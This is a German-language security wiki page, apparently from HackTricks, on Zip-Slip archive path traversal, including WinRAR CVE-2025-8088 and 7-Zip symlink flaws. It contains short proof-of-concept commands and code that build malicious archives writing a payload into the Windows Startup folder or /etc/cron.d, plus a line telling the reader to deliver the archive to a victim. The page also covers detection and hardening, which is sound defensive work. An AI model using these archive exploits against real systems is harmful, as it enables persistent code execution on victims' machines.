# Archive Extraction Path Traversal ("Zip-Slip" / WinRAR CVE-2025-8088)

{{#include ../banners/hacktricks-training.md}}

## Überblick

Viele Archivformate (ZIP, RAR, TAR, 7-ZIP usw.) erlauben es jedem Eintrag, seinen eigenen **internen Pfad** zu enthalten. Wenn ein Extraktionsprogramm diesen Pfad blind berücksichtigt, wird ein manipuliertes Dateinamen mit `..` oder einem **absoluten Pfad** (z. B. `C:\Windows\System32\`) außerhalb des vom Benutzer ausgewählten Verzeichnisses geschrieben.
Diese Klasse von Schwachstellen ist allgemein als *Zip-Slip* oder **archive extraction path traversal** bekannt.

Die Folgen reichen vom Überschreiben beliebiger Dateien bis hin zur direkten Ausführung von **remote code execution (RCE)**, indem eine Payload an einem **auto-run**-Ort wie dem Windows-Ordner *Startup* abgelegt wird.

## Grundursache

1. Der Angreifer erstellt ein Archiv, dessen Datei-Header eine oder mehrere der folgenden Angaben enthalten:
* Relative Traversal-Sequenzen (`..\..\..\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe`)
* Absolute Pfade (`C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\payload.exe`)
* Oder manipulierte **symlinks**, die außerhalb des Zielverzeichnisses aufgelöst werden (häufig bei ZIP/TAR unter *nix*).
2. Das Opfer extrahiert das Archiv mit einem verwundbaren Tool, das dem eingebetteten Pfad vertraut (oder symlinks folgt), anstatt ihn zu bereinigen oder die Extraktion auf das ausgewählte Verzeichnis zu beschränken.
3. Die Datei wird am vom Angreifer kontrollierten Speicherort geschrieben und ausgeführt/geladen, sobald das System oder der Benutzer diesen Pfad das nächste Mal auslöst.

### .NET `Path.Combine` + `ZipArchive` traversal

Ein häufiges .NET-Anti-Pattern besteht darin, das vorgesehene Ziel mit dem **user-controlled** `ZipArchiveEntry.FullName` zu kombinieren und die Extraktion ohne Pfadnormalisierung durchzuführen:<sup>[[4]](#references)</sup>
```csharp
using (var zip = ZipFile.OpenRead(zipPath))
{
foreach (var entry in zip.Entries)
{
var dest = Path.Combine(@"C:\samples\queue\", entry.FullName); // drops base if FullName is absolute
entry.ExtractToFile(dest);
}
}
```
- Wenn `entry.FullName` mit `..\\` beginnt, führt dies zu einem Traversal; wenn es sich um einen **absoluten Pfad** handelt, wird die linke Komponente vollständig verworfen, wodurch die Extraktionsidentität zu einem **arbitrary file write** wird.
- Proof-of-concept-Archiv, um in ein benachbartes `app`-Verzeichnis zu schreiben, das von einem geplanten Scanner überwacht wird:
```python
import zipfile
with zipfile.ZipFile("slip.zip", "w") as z:
z.writestr("../app/0xdf.txt", "ABCD")
```
Das Ablegen dieser ZIP-Datei im überwachten Eingangsordner führt zu `C:\samples\app\0xdf.txt` und beweist damit eine Traversal außerhalb von `C:\samples\queue\`, wodurch nachgelagerte Primitives (z. B. DLL hijacks) ermöglicht werden.

## Real-World Example – WinRAR ≤ 7.12 (CVE-2025-8088)

WinRAR für Windows (einschließlich der `rar`- / `unrar`-CLI, der DLL und des portablen Quellcodes) validierte Dateinamen während der Extraktion nicht.
Ein schädliches RAR-Archiv mit einem Eintrag wie:
```text
..\..\..\Users\victim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\payload.exe
```
würde außerhalb des ausgewählten Ausgabeverzeichnisses und im *Startup*-Ordner des Benutzers landen. Nach der Anmeldung führt Windows automatisch alles aus, was sich dort befindet, und ermöglicht dadurch persistente RCE.<sup>[[5]](#references)</sup>

### Erstellen eines PoC-Archivs (Linux/Mac)
```bash
# Requires rar >= 6.x
mkdir -p "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
cp payload.exe "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
rar a -ep evil.rar evil/*
```
Verwendete Optionen:
* `-ep`  – Dateipfade genau wie angegeben speichern (führendes `./` **nicht** entfernen).

Liefere `evil.rar` an das Opfer und weise es an, das Archiv mit einem verwundbaren WinRAR-Build zu extrahieren.

### In freier Wildbahn beobachtete Ausnutzung

ESET berichtete über Spear-Phishing-Kampagnen von RomCom (Storm-0978/UNC2596), bei denen RAR-Archive angehängt wurden, die CVE-2025-8088 ausnutzten, um angepasste Backdoors bereitzustellen und Ransomware-Operationen zu erleichtern.<sup>[[5]](#references)</sup>

## Neuere Fälle (2024–2025)

### 7-Zip ZIP symlink traversal → RCE (CVE-2025-11001 / ZDI-25-949)
* **Bug**: ZIP-Einträge, die **symbolische Links** waren, wurden während der Extraktion dereferenziert. Dadurch konnten Angreifer das Zielverzeichnis verlassen und beliebige Pfade überschreiben. Die Benutzerinteraktion beschränkt sich auf das *Öffnen/Extrahieren* des Archivs.<sup>[[1]](#references)</sup>
* **Betroffen**: 7-Zip 21.02–24.09 (Windows- und Linux-Builds). In **25.00** (Juli 2025) und später behoben.
* **Auswirkungspfad**: `Start Menu/Programs/Startup` oder von Services verwendete Pfade überschreiben → Code wird bei der nächsten Anmeldung oder beim Neustart des Services ausgeführt.
* **Schneller PoC (Linux)**:
```bash
mkdir -p out
ln -s /etc/cron.d evil
zip -y exploit.zip evil   # -y preserves symlinks
7z x exploit.zip -o/tmp/target   # vulnerable 7-Zip writes to /etc/cron.d
```
Bei einem gepatchten Build wird `/etc/cron.d` nicht verändert; der symlink wird als Link innerhalb von `/tmp/target` extrahiert.

### Go mholt/archiver Unarchive() Zip-Slip (CVE-2025-3445)
* **Bug**: `archiver.Unarchive()` folgt `../` und symbolischen ZIP-Links und schreibt außerhalb von `outputDir`.<sup>[[2]](#references)</sup>
* **Betroffen**: `github.com/mholt/archiver` ≤ 3.5.1 (das Projekt ist inzwischen deprecated).
* **Fix**: Auf `mholt/archives` ≥ 0.1.0 wechseln oder vor dem Schreiben Prüfungen auf canonical paths implementieren.
* **Minimale Reproduktion**:
```go
// go test . with archiver<=3.5.1
archiver.Unarchive("exploit.zip", "/tmp/safe")
// exploit.zip holds ../../../../home/user/.ssh/authorized_keys
```

## Hinweise zur Erkennung

* **Statische Untersuchung** – Archiveinträge auflisten und jeden Namen markieren, der `../`, `..\\`, *absolute Pfade* (`/`, `C:`) enthält oder bei dem es sich um einen *symlink* handelt, dessen Ziel außerhalb des Extraktionsverzeichnisses liegt.
* **Canonicalisation** – Sicherstellen, dass `realpath(join(dest, name))` weiterhin mit `dest` beginnt. Andernfalls ablehnen.<sup>[[3]](#references)</sup>
* **Sandbox-Extraktion** – In ein entbehrliches Verzeichnis mit einem *sicheren* Extractor dekomprimieren (z. B. `bsdtar --safe --xattrs --no-same-owner`, 7-Zip ≥ 25.00) und überprüfen, dass die resultierenden Pfade innerhalb des Verzeichnisses bleiben.
* **Endpoint-Monitoring** – Alarm auslösen, wenn kurz nach dem Öffnen eines Archivs durch WinRAR/7-Zip/usw. neue ausführbare Dateien in `Startup`-/`Run`-/`cron`-Pfade geschrieben werden.

## Mitigation & Hardening

1. **Extractor aktualisieren** – WinRAR 7.13+ und 7-Zip 25.00+ implementieren eine Sanitisation von Pfaden und symlinks. Beide Tools verfügen weiterhin über kein Auto-Update.
2. Archive nach Möglichkeit mit „**Do not extract paths**“ / „**Ignore paths**“ extrahieren.
3. Unter Unix vor der Extraktion Berechtigungen reduzieren und einen **chroot/namespace** einrichten; unter Windows **AppContainer** oder eine Sandbox verwenden.
4. Bei selbst entwickeltem Code vor dem Erstellen/Schreiben mit `realpath()`/`PathCanonicalize()` normalisieren und jeden Eintrag ablehnen, der das Zielverzeichnis verlässt.

## Weitere betroffene / historische Fälle

* 2018 – Umfangreiches *Zip-Slip*-Advisory von Snyk, das viele Java-/Go-/JS-Bibliotheken betraf.
* 2023 – 7-Zip CVE-2023-4011 mit ähnlichem traversal bei der `-ao`-Zusammenführung.
* 2025 – HashiCorp `go-slug` (CVE-2025-0377): TAR-Extraktions-traversal in slugs (Patch in v1.2).
* Jede benutzerdefinierte Extraktionslogik, die vor dem Schreiben nicht `PathCanonicalize` / `realpath` aufruft.

## References

- [1] [Trend Micro ZDI-25-949 – 7-Zip symlink ZIP traversal (CVE-2025-11001)](https://www.zerodayinitiative.com/advisories/ZDI-25-949/)
- [2] [JFrog Research – mholt/archiver Zip-Slip (CVE-2025-3445)](https://research.jfrog.com/vulnerabilities/archiver-zip-slip/)
- [3] [Meziantou – Prevent Zip Slip in .NET](https://www.meziantou.net/prevent-zip-slip-in-dotnet.htm)
- [4] [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [5] [ESET Research – Update WinRAR tools now: RomCom and others exploiting zero-day vulnerability (CVE-2025-8088)](https://www.welivesecurity.com/en/eset-research/update-winrar-tools-now-romcom-and-others-exploiting-zero-day-vulnerability/)

{{#include ../banners/hacktricks-training.md}}
